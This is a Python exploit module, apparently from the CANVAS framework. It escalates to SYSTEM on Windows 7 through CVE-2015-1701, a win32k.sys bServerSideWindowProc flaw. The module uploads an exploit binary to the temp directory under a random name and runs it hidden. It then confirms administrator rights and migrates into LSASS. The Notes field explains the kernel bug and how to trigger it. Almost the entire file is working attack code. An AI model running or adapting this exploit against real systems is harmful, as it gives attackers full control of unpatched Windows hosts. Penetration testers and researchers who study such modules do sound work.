#!/usr/bin/env python

import os
import sys
import random

if '.' not in sys.path:
    sys.path.append('.')

from exploitutils import *
from ExploitTypes.windowsLocalExploit import WindowsLocalExploit

NAME                           = 'win32k.sys bServerSideWindowProc flag logic issue'
DESCRIPTION                    = 'win32k.sys bServerSideWindowProc privilege escalation'
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = 'Microsoft'
DOCUMENTATION['Repeatability'] = 'Infinite'
DOCUMENTATION['CVE Name']      = 'CVE-2015-1701'
DOCUMENTATION['CVE Url']       = 'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1701'
VERSION                        = '1.0'
PROPERTY                       = {}
PROPERTY['TYPE']               = 'Exploit'
PROPERTY['SITE']               = 'Local'
PROPERTY['ARCH']               = [['Windows']]
PROPERTY['VERSION']            = ['7']
PROPERTY['MS PATCHES']         = ["KB3034344"]
DOCUMENTATION['Notes']         = """
This module exploits a vulnerability on the win32k.sys driver.
The bServerSideWindowProc flag on the window's handle structure is meant to be used to improve the performance of usercallbacks by replacing the call to a userland function with a kernel one.
Setting this flag allows the window procedure to run on kernel mode.
When creating a new window, after calling the ClientCopyImage usercallback, the kernel doesn't check the possibility that the bServerSideWindowProc could have been raised. And thus, execution continues as if the flag was unset.
By hooking ClientCopyImage it is possible to set the bServerSideWindowProc and define a new window procedure by calling the SetWindowLongPtr function on the newly created window.
This will lead to the executon of the defined window procedure on kernel mode.

Tested on:
   Windows XP SP3 x86
   Windows 7 Professional x86
   Windows 7 Professional SP1 x64
   Windows Server 2003 Standard x64
   Windows Server 2008 R2 Standard x64 SP1

This exploit doesn't work on Windows 8.1
"""

CHANGELOG = """
"""

targets = {
    0: ['Autodetect', [0, 0, 0, 0]]
}


class theexploit(WindowsLocalExploit):
    def __init__(self):
        WindowsLocalExploit.__init__(self)
        self.name           = NAME
        self.node           = None

        self.local_res      = os.path.join(os.path.dirname(__file__), 'Resources')

        self.remote_path    = '%TMP%\\' # remote base path
        self.remote_name    = '%s.exe' % random.randint(0, 1000)
        self.remote_exp     = ''

        self.isX64          = False

    def spawn_exploit(self, arg1):
        try:
            dst = os.path.join(self.remote_path, self.remote_name)
            ret = self.node.shell.CreateProcessA(dst + ' ' +  arg1,
                                                 inherithandles = 1,
                                                 dwCreationFlags = 0x08000000)
            if not ret:
                return False
        except Exception, ex:
            self.log_error('%s' % ex)
            return False

        return True

    def run(self):
        succeeded = []
        for node in self.argsDict['passednodes']:
            self.node = node

            if not self.is_windows_node():
                continue

            if self.is_64bit_node():
                self.local_name = "exploit_64.exe"
            else:
                self.local_name = 'exploit.exe'

            self.local_exp = os.path.join(self.local_res, self.local_name)

            # first, we check to make sure we are not
            # already local/SYSTEM
            whoami = self.exploitnodes('whoami', [self.node])[0]

            self.log_info('Currently running as: %s' % (whoami))
            if whoami[-1] == '$':
                self.log_info("It appears you are already running as LOCAL/SYSTEM")
                succeeded.append(True)
                continue

            if not self.is_win7_node():
                self.log_error("Not a Win7 node, bailing")
                succeeded.append(False)
                continue

            self.remote_path = self.node.shell.GetTempPathA()
            if not self.remote_path:
                self.log_error('Could not resolve full temp dir path')
                succeeded.append(False)
                continue
            else:
                self.log_info('Temp dir: %s' % self.remote_path)
                self.remote_exp = os.path.join(self.remote_path, self.remote_name)


            if self.node.shell.chdir(self.remote_path) < 0:
                self.log_error('Could not chdir into %s' % self.remote_path)
                succeeded.append(False)
                continue

            # upload binaries
            if not self.nodeUpload(self.local_exp, self.remote_exp):
                succeeded.append(False)
                self.log_error('Error while uploading exploit binary')
                continue

            # spawn exploit
            pid  = self.node.shell.getpid()
            arg1 = "%s" % pid

            if not self.spawn_exploit(arg1):
                self.log_error('Could not spawn %s' % NAME)
                succeeded.append(False)
                continue

            logging.info("Checking if we are now an administrator...")
            check_admin = self.engine.getModuleExploit("check_admin_user")
            check_admin.link(self)
            check_admin.argsDict["passednodes"] = [node]
            is_admin = check_admin.run()

            if is_admin:
                # Just do a default mosdefmigrate and be done with it
                migrate = self.engine.getModuleExploit("mosdefmigrate")
                migrate.link(self)
                ret = migrate.run()

                if not ret:
                    self.log_error("Failed to migrate to LSASS")
                    self.log_error('%s failed' % NAME)
                    succeeded.append(False)
                else:
                    # just to be sure
                    if self.compromised():
                        self.nlog("Compromised")
                        
                    succeeded.append(is_admin or self.compromised())

            time.sleep(1)
            self.cleanup()

        return all(succeeded)


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
